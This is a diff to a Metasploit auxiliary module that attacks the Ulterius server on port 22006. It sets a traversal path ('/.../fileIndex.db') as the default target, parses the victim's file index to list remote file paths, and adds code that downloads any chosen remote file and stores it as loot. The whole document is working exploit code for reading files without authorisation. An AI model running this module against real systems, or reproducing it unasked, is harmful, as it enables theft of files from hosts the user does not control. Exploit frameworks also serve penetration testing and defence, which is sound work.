@@ -34,8 +34,7 @@ class MetasploitModule < Msf::Auxiliary
       register_options(
         [
           Opt::RPORT(22006),
-          OptString.new('TARGETURI', [true, 'The path of the web application', '/']),
-          OptBool.new('INDEX', [false, 'Attempt to retrieve and parse fileIndex.db', false])
+          OptString.new('TARGETURI', [true, 'Path to the file to download', '/.../fileIndex.db']),
         ])
   end
 
@@ -59,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
     remote_files = ""
 
     index = 0
-    print_status("Starting to parse fileIndex.db...")
+    print_status('Starting to parse fileIndex.db...')
     while index < parse_data.length
       index, filename = process_data(index, parse_data)
       index, directory = process_data(index, parse_data)
@@ -68,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
       #skip FFFFFFFFFFFFFFFF
       index += 8
     end
-    myloot = store_loot("ulterius.fileIndex.db", "text/plain", datastore['RHOST'], remote_files, "fileIndex.db", "Remote file system")
+    myloot = store_loot('ulterius.fileIndex.db', 'text/plain', datastore['RHOST'], remote_files, 'fileIndex.db', 'Remote file system')
     print_status("Remote file paths saved in: #{myloot.to_s}")
   end
 
@@ -78,10 +77,12 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET'
     })
     if res && res.code == 200
-      if datastore['INDEX']
+      if target_uri.path =~ /fileIndex\.db/i
         inflate_parse(res.body)
       else
-        print_status(res.body)
+        print_status(target_uri.path)
+        myloot = store_loot('ulterius.file.download', 'text/plain', datastore['RHOST'], res.body, target_uri.path, 'Remote file system')
+        print_status("File contents saved: #{myloot.to_s}")
       end
     end
   end
